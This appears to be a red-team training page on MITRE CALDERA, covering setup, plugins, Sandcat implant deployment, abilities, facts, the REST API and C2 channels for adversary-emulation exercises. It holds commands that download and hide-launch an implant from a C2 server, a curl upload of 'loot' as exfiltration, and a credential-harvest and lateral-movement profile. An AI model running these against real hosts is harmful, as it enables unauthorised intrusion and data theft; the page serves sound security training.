---
layout: training-page
title: "MITRE CALDERA — Adversary Emulation Platform — Red Team Academy"
module: "Red Team Tools"
tags:
  - caldera
  - mitre
  - adversary-emulation
  - purple-team
  - sandcat
  - atomic
  - c2
page_key: "tools-caldera"
render_with_liquid: false
---

# MITRE CALDERA — Adversary Emulation Platform

CALDERA is MITRE's open-source adversary-emulation platform: an asynchronous C2 server with a REST API, a VueJS web UI (Magma), and a plugin ecosystem built on top of the MITRE ATT&CK framework. Two audiences: **red teams** who want autonomous repeatable attack chains, and **purple teams** who want to drive detection tests against a SIEM systematically.

## Configuration Setup

After installation, CALDERA prefers a local config over the default. Copy and edit before first start:

<pre><code>cp conf/default.yml conf/local.yml
</code></pre>

Critical fields in `conf/local.yml`:

<pre><code>host: 0.0.0.0
port: 8888

users:
  red:
    admin: CHANGE_THIS_PASSWORD
  blue:
    blue: CHANGE_THIS_PASSWORD

api_key_red: CHANGE_THIS_API_KEY
api_key_blue: CHANGE_THIS_BLUE_KEY

# Encryption — required for any internet-exposed instance
crypt_salt: RANDOM_32_CHAR_STRING
encryption_key: RANDOM_32_CHAR_STRING

# Enable plugins by listing them:
plugins:
  - access
  - atomic
  - compass
  - debrief
  - fieldmanual
  - gameboard
  - human
  - manx
  - response
  - sandcat
  - stockpile
  - training
</code></pre>

Start the server:

<pre><code># Development — disables HTTPS enforcement, uses local.yml
python3 server.py --insecure

# First run with Vue UI rebuild:
python3 server.py --insecure --build

# Docker:
docker run -d -p 8888:8888 \
  -v $(pwd)/conf/local.yml:/usr/src/app/conf/local.yml \
  mitre/caldera
</code></pre>

Default login: `http://localhost:8888` — credentials set in `conf/local.yml` (defaults `admin/admin`). **Change all passwords before exposing to any network.**

Security note: CVE-2025-27364 affects CALDERA before v5.1.0 (Feb 2025). Update if running anything older on a shared network.

## Core Concepts

| Concept | Definition |
|---------|-----------|
| **Agent** | An implant on a target host, identified by a unique `paw`. Beacons back to the C2 on a jitter schedule. Belongs to a group (`red` by default). |
| **Ability** | A single ATT&CK technique implementation — YAML declaring the command, platform, executor, payloads, parsers, and fact requirements. |
| **Adversary** | An ordered list of ability IDs — an emulation profile like "APT29" or "Worm". Stored as YAML in `data/adversaries/`. |
| **Operation** | A running instance executing an adversary's abilities against an agent group. States: running, paused, finished, run_one_link. |
| **Fact** | A trait/value/score triple representing discovered data (username, IP, path). Substituted into ability commands via `#{trait.name}`. Higher scores execute first. |
| **Fact Source** | YAML file bundling pre-seeded facts to start an operation with known values. |
| **Planner** | Logic deciding execution order. Built-in: `atomic` (sequential), `batch` (parallel), `buckets` (tactic-grouped state machine). |
| **Parser** | Server-side module that extracts new facts from ability output, enabling dynamic chaining. |
| **Link** | One (agent, ability) execution unit, created when an ability's fact requirements are satisfied. |
| **Obfuscator** | Encodes commands before delivery: `plain-text`, `base64`, `base64jumble`, `caesar cipher`, `steganography`. |

## Plugin Ecosystem

Enable plugins in `conf/local.yml` (or via **Advanced → Configuration** in the UI) then restart the server. All ship as git submodules under `plugins/`.

| Plugin | What It Adds |
|--------|-------------|
| **sandcat** | Default Go cross-platform agent (Windows/Linux/macOS). Compiled on demand, served via HTTP. Also called `54ndc47`. |
| **manx** | TCP reverse-shell agent + interactive terminal GUI for manual host interaction. |
| **stockpile** | The built-in ability/adversary/fact-source library — hundreds of abilities organized by ATT&CK tactic. |
| **atomic** | Imports all Red Canary Atomic Red Team tests as Caldera abilities (~1,800+ tests). |
| **compass** | ATT&CK Navigator integration — generates JSON coverage layers from adversary profiles. |
| **access** | Initial-access and recon abilities; Metasploit integration ("Load Metasploit Abilities"). |
| **debrief** | Post-operation analytics, attack-graph visualization, PDF and JSON campaign reports. |
| **gameboard** | Red vs Blue real-time scoring dashboard with detection metrics. |
| **human** | Simulated user noise — runs Chrome and native apps to generate benign background activity. |
| **response** | Defender-focused incident-response adversaries and abilities for blue team exercises. |
| **training** | In-browser CTF certification course for learning Caldera from beginner to advanced. |
| **emu** | CTID adversary emulation plans — pre-built full-campaign adversaries (APT29, FIN6, OilRig, menuPass). |
| **pathfinder** | Vulnerability scanner integration for network discovery and path planning. |
| **builder** | Dynamic C# compilation — builds executable payloads and abilities at runtime. |
| **ssl** | HTTPS via HAProxy on port 8443 (Linux/macOS only). Wraps the HTTP server with TLS. |
| **caltack** | Offline ATT&CK matrix for air-gapped environments. |
| **mock** | Virtual agents defined in `conf/agents.yml` — test operations without real implants. |
| **fieldmanual** | Built-in documentation and wiki. |
| **magma** | The VueJS web UI (loaded by default in v5+). |

## Deploying Agents (Sandcat)

Sandcat is built on demand — CALDERA compiles a Go binary with your specified extensions when you request the download URL. The server is included in the binary at compile time.

### Linux / macOS

<pre><code>server="http://192.168.1.10:8888"
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:linux" \
  -H "server:${server}" \
  -H "group:red" \
  -H "gocat-extensions:proxy_http,shells" \
  ${server}/file/download > /tmp/sandcat
chmod +x /tmp/sandcat
/tmp/sandcat -server ${server} -group red -v &
</code></pre>

### Windows PowerShell

<pre><code>$server="http://192.168.1.10:8888"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$wc.Headers.add("server",$server)
$wc.Headers.add("group","red")
$wc.Headers.add("gocat-extensions","proxy_http,shells")
$data=$wc.DownloadData("$server/file/download")
[io.file]::WriteAllBytes("C:\Users\Public\sandcat.exe",$data)
Start-Process -FilePath "C:\Users\Public\sandcat.exe" `
  -ArgumentList "-server $server -group red" `
  -WindowStyle Hidden
</code></pre>

### Sandcat Runtime Flags

| Flag | Default | Purpose |
|------|---------|---------|
| `-server` | — | C2 URL (required) |
| `-group` | `red` | Agent group name |
| `-paw` | random | Custom agent identifier |
| `-c2` | `HTTP` | Channel: `HTTP`, `DNS`, `FTP`, `GIST`, `Slack`, `SmbPipe` |
| `-delay` | 0 | Seconds to wait before first beacon |
| `-jitter` | 2 | Seconds of random sleep between beacons |
| `-listenP2P` | false | Enable peer-to-peer relay |
| `-httpProxyGateway` | — | Proxy gateway address |
| `-v` | false | Verbose logging |

### gocat-extensions

Requested via HTTP header at download time. Selected extensions are compiled into the binary.

| Extension | Type | What It Adds |
|-----------|------|-------------|
| `proxy_http` | C2 | HTTP proxy channel |
| `dns_tunneling` | C2 | DNS-over-UDP C2 channel |
| `gist` | C2 | GitHub Gist dead-drop C2 |
| `slack` | C2 | Slack-channel dead-drop C2 |
| `ftp` | C2 | FTP beacon channel |
| `proxy_smb_pipe` | C2 | SMB named-pipe P2P relay |
| `shells` | Executor | `sh`, `bash`, `cmd`, `powershell` executors |
| `shellcode` | Executor | Raw shellcode execution |
| `donut` | Executor | Donut shellcode loader |
| `native_aws` | Executor | AWS SDK native actions |

### Manual Sandcat Build

<pre><code>cd plugins/sandcat/gocat/
GOOS=windows go build -o ../payloads/sandcat.go-windows -ldflags="-s -w" sandcat.go
GOOS=linux   go build -o ../payloads/sandcat.go-linux   -ldflags="-s -w" sandcat.go
GOOS=darwin  go build -o ../payloads/sandcat.go-darwin  -ldflags="-s -w" sandcat.go
</code></pre>

### Manx (Interactive Reverse Shell)

Enable the `manx` plugin, navigate to the Manx UI page, select your target OS, and download the payload. Manx provides an interactive shell instead of a beaconing implant — use it for manual hands-on-keyboard activity during an operation.

## Adversary Profiles

Adversary profiles live at `data/adversaries/<uuid>.yml` or inside plugin data directories.

<pre><code>id: 0f4c3c67-845e-49a0-927e-90ed33c044e0
name: Credential Harvest + Lateral
description: Harvest credentials then move laterally via SMB
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
  - 90c2efaa-8205-480d-8bb6-61d90dbaf81b   # whoami / system info
  - 4cd4eb0f-99f6-4f88-9d05-ad9c4ec56770   # find writable shares
  - 65048ec1-f7ca-49d3-9410-10813e472b30   # copy implant via SMB
  - deeb8a98-7702-431c-8531-87b40c8a5e0c   # execute on remote host
</code></pre>

The `atomic_ordering` list references ability UUIDs. Order matters for the `atomic` planner — abilities execute in list order.

**Built-in adversaries** (from Stockpile): browse via **Campaigns → Adversaries** in the UI. APT29, Hunter, Nosy Neighbor, and dozens more are available immediately.

## Custom Abilities

Abilities live at `data/abilities/<tactic>/<uuid>.yml` or in any plugin's data directory. The YAML schema:

<pre><code>- id: 9a30740d-3aa8-4c23-8efa-d51215e8a5b9
  name: Enumerate WiFi networks
  description: List nearby WiFi SSIDs
  tactic: discovery
  technique:
    attack_id: T1016
    name: System Network Configuration Discovery
  platforms:
    darwin:
      sh:
        command: ./wifi.sh
        payload: wifi.sh
        cleanup: rm -f ./wifi.sh
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.wifi.ssid
              edge: has_password
              target: host.wifi.password
    windows:
      psh:
        command: .\wifi.ps1
        payload: wifi.ps1
        timeout: 60
    linux:
      sh:
        command: nmcli -t -f SSID dev wifi
  requirements:
    - plugins.stockpile.app.requirements.basic:
        - source: host.user.name
  buckets:
    - discovery
  singleton: false
  repeatable: false
</code></pre>

**Executor names:** `psh` (PowerShell), `cmd` (cmd.exe), `sh` (shell), `pwsh` (cross-platform PowerShell Core), `proc` (direct process).

**Fact substitution:** `#{host.user.name}` in the command is replaced with the matching fact's value at link-creation time.

**Payloads** are auto-downloaded by the agent before execution and cleaned up when the operation ends.

## Fact System

Facts carry discovered data through an operation, enabling dynamic ability chaining.

<pre><code># data/sources/my-seed.yml
id: 88d2e1e4-29ed-4b50-855e-d4d6d1a5d4e8
name: lab_environment
facts:
  - trait: host.user.name
    value: administrator
    score: 100
  - trait: domain.fqdn
    value: corp.example.local
    score: 50
  - trait: remote.host.ip
    value: 192.168.1.50
    score: 75
relationships:
  - source:
      trait: host.user.name
      value: administrator
    edge: has_password
    target:
      trait: host.user.password
      value: P@ssw0rd!
rules:
  - action: DENY
    trait: host.user.name
    match: guest
  - action: ALLOW
    trait: remote.host.ip
    match: 192.168.1\..*
</code></pre>

- **trait** — dotted namespace (`host.user.name`, `domain.fqdn`, `remote.host.ip`)
- **score** — priority when multiple facts match a `#{trait}` placeholder; higher wins
- **rules** — ALLOW/DENY filters (regex on value) applied before facts reach abilities

## Running Operations

### Start an Operation (GUI)

1. **Operations → New Operation**
2. Fill: Name, Group, Adversary, Planner, Fact Source
3. Set: Obfuscator, Jitter (e.g., `2/8` for 2–8s random delay), Visibility threshold
4. Toggle **Autonomous** (planner drives) vs **Manual** (you approve each link)
5. Click **Start**

### Planners

| Planner | Behavior |
|---------|---------|
| `atomic` | Executes abilities in `atomic_ordering` sequence, one at a time per agent |
| `batch` | Retrieves all applicable abilities simultaneously, executes in parallel, repeats until no new links |
| `buckets` | State-machine planner; groups abilities by ATT&CK tactic bucket, transitions between tactics as facts accumulate |

### Manual Mode

In manual mode, the operation surfaces each potential link as "pending." You review the command, the agent, and the expected output, then approve or skip. Useful for sensitive engagements or when you want human eyes on every action.

### Operation States

<pre><code># Via REST API — change operation state:
curl -X PATCH \
  -H "KEY:YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"state":"paused"}' \
  http://localhost:8888/api/v2/operations/OP_ID

# States: running | paused | finished | run_one_link
</code></pre>

## REST API

All API calls use header `KEY: <api_key_red>` (set in `conf/local.yml`). Localhost requests can omit the key.

<pre><code># List all agents
curl -H "KEY:ADMIN123" http://localhost:8888/api/v2/agents

# Get specific agent
curl -H "KEY:ADMIN123" http://localhost:8888/api/v2/agents/AGENT_PAW

# Create an operation
curl -X POST \
  -H "KEY:ADMIN123" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test-op",
    "adversary": {"adversary_id": "0f4c3c67-845e-49a0-927e-90ed33c044e0"},
    "group": "red",
    "planner": {"id": "atomic"},
    "source": {"id": "88d2e1e4-29ed-4b50-855e-d4d6d1a5d4e8"}
  }' \
  http://localhost:8888/api/v2/operations

# Get operation details (links, facts, agent output)
curl -H "KEY:ADMIN123" http://localhost:8888/api/v2/operations/OP_ID

# List abilities
curl -H "KEY:ADMIN123" http://localhost:8888/api/v2/abilities

# Download payload (served at file endpoint, not api/v2)
curl -X POST \
  -H "file:sandcat.go" \
  -H "platform:linux" \
  http://localhost:8888/file/download > sandcat

# Upload exfiltrated file
curl -F 'data=@./loot.txt' http://localhost:8888/file/upload

# Delete agent
curl -X DELETE \
  -H "KEY:ADMIN123" \
  http://localhost:8888/api/v2/agents/AGENT_PAW
</code></pre>

Use `/api/v2/` — the legacy `/api/rest` endpoint is deprecated.

## C2 Channels

| Channel | Transport | Use Case |
|---------|-----------|---------|
| **HTTP** (default) | Port 8888 | Standard beacon over HTTP |
| **HTTPS** | Port 8443 | Via SSL plugin + HAProxy |
| **DNS** | UDP/53 | DNS tunneling — bypass HTTP egress blocks |
| **TCP** | Configurable | Direct socket (Manx default) |
| **FTP** | Port 21 | File-server beacon |
| **GIST** | api.github.com | GitHub Gist dead-drop |
| **Slack** | Slack API | Slack-channel dead-drop |
| **SmbPipe** | Named pipes | P2P internal lateral relay |
| **HTML** | Port 8888 | HTML form contact (low-and-slow) |

Set the channel on the agent with `-c2 <method>`. The server must have the corresponding contact enabled via the plugin config.

## Compass Plugin (ATT&CK Coverage)

Compass generates ATT&CK Navigator layers from adversary profiles, showing which techniques are covered.

1. Enable `compass` in `conf/local.yml`, restart server
2. In the UI: **Plugins → Compass**
3. Select an adversary profile
4. Click **Generate Layer** — downloads `layer.json`
5. Open ATT&CK Navigator (`mitre-attack.github.io/attack-navigator/`)
6. **+ → Open Existing Layer → Upload from local → select layer.json**

The resulting heatmap highlights every technique in the adversary's ability set. Use it for:
- Coverage gap analysis (what techniques isn't the adversary testing?)
- Briefing executives with a visual ATT&CK matrix
- Comparing red plan coverage vs blue detection coverage

## Debrief Plugin (Reporting)

Enable `debrief` in `conf/local.yml`. After an operation completes:

1. **Plugins → Debrief**
2. Select one or more completed operations
3. View: network topology graph, operation timeline replay, TTPs table with ATT&CK detection mappings, discovered facts
4. Export:
   - **PDF** — full campaign report with topology visualization + statistics + agents + TTPs + detection strategies
   - **JSON (Operation Report)** — full structured data
   - **JSON (Event Logs)** — flat per-link events for SIEM/database ingestion

PDF via API:
<pre><code>curl -X POST \
  -H "KEY:ADMIN123" \
  -H "Content-Type: application/json" \
  -d '{
    "operation_ids": ["OP_ID"],
    "report_sections": ["executive_summary","attack_graph","techniques","findings"],
    "header-logo": "BASE64_LOGO_STRING"
  }' \
  http://localhost:8888/plugin/debrief/pdf > report.pdf
</code></pre>

## Emu Plugin (Adversary Emulation Plans)

The `emu` plugin (from the CTID — Center for Threat-Informed Defense) provides pre-built full-campaign adversary emulation plans based on real threat actor profiles. Plans included: **APT29, FIN6, OilRig, menuPass, MicroBurst, Carbanak**.

Each plan implements a complete kill chain — from initial execution through persistence, lateral movement, and exfil — with multiple variants and fact-chained abilities. Load via UI after enabling the plugin.

## GameBoard Plugin (Red vs Blue Scoring)

Enable `gameboard`. Provides a real-time scoring dashboard tracking:
- Which abilities were executed vs detected
- Red team score (techniques executed)
- Blue team score (detections fired)
- Timeline of events visible to each team independently

Designed for exercise control rooms — allows a facilitator to track both sides simultaneously.

## Mock Agents (Testing Without Implants)

Define virtual agents in `conf/agents.yml` to test operations without deploying real implants:

<pre><code>agents:
  - paw: test-agent-01
    group: red
    platform: windows
    executors:
      - psh
      - cmd
    host: 192.168.1.100
    username: administrator
    architecture: amd64
    location: C:\Users\Public\sandcat.exe
    pid: 1234
    ppid: 4321
    sleep_min: 2
    sleep_max: 8
</code></pre>

Requires the `mock` plugin enabled. Operations run against mock agents execute the link logic server-side without sending payloads to any real host.

## OPSEC Notes

- Never expose the CALDERA web UI to the internet or untrusted networks — it is not hardened against external attack
- Change all default credentials in `conf/local.yml` before any multi-user use
- Sandcat's traffic pattern is intentionally detectable — it's designed for purple-team work, not production red-team ops
- For real red-team engagements, use Sandcat for initial access only; pivot to Cobalt Strike / Havoc / Mythic for the main operation
- HTTP transport is unencrypted at port 8888 — use the SSL plugin and put a TLS proxy in front for any shared environment

## Resources

- MITRE CALDERA GitHub — `github.com/mitre/caldera`
- CALDERA documentation — `caldera.readthedocs.io`
- CALDERA Plugin Library — `caldera.readthedocs.io/en/latest/Plugin-library.html`
- Sandcat details — `caldera.readthedocs.io/en/latest/plugins/sandcat/Sandcat-Details.html`
- CTID Emu plans — `github.com/mitre/emu`
- Debrief plugin — `github.com/mitre/debrief`
- Compass plugin — `github.com/mitre/compass`
- MITRE ATT&CK — `attack.mitre.org`
- Atomic Red Team integration — `tools/atomic-red-team/`
- Self-hosted tools overview — `tools/self-hosted-tools/`
